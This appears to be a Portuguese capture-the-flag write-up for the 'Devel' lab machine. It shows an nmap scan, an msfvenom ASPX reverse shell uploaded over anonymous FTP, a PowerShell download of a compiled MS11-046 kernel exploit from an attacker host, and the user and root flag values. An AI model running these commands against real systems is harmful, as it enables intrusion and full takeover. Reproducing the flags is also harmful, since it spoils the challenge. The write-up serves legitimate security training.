# Devel WriteUp

## Scan and enumeration

**Comando**: sudo nmap -sV -Pn 10.129.217.239 -v -T5 -oN scan.txt

```
# Nmap 7.92 scan initiated Wed Dec 29 12:15:29 2021 as: nmap -sV -Pn -v -T5 -oN scan.txt 10.129.217.239
Nmap scan report for 10.129.217.239
Host is up (0.16s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 29 12:15:47 2021 -- 1 IP address (1 host up) scanned in 17.80 seconds
```

## Exploitation

Após feito o scan do alvo, podemos ver que o mesmo possui o usuário "anonymous" habilitado no ftp. Com isso, podemos gerar uma reverse shell em aspx e fazer o upload no ftp do alvo, e em seguida executar o arquivo pelo navegador para receber a reverse shell.

**Comando para criar a reverse shell**: msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=YOUR_IP LPORT=80 -o reverse-shell.aspx  

Tendo criado a reverse shell, podemos logar no ftp com o usuário anonymous e fazer o upload da shell com o comando 'put'.

Após fazer o upload da reverse shell, podemos executar no navegador.

## Privilege Escalation

Tendo pego a reverse shell, podemos partir para a escalção de privilégios. Podemos verificar a versão do sistema com o comando "systeminfo" e ver que sua versão é vulnerável a kernel exploit ms11-046.

**Exploit download**: https://www.exploit-db.com/exploits/40564 or `searchsploit -m 40564`.

**Compile exploit**: i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32

**Download exploit on target** : powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.13:9090/MS11-046.exe', 'c:\Users\Public\Downloads\MS11-046.exe')"

Após executa o exploit, seremos admin.

* User Flag:
```
cd c:\Users\babis\Desktop
type user.txt.txt
9ecdd6a3aedf24b41562fea70f4cb3e8
```

* Root Flag:
```
cd c:\Users\Administrator\Desktop
type root.txt
e621a0b5041708797c4fc4728bc72b4b
```
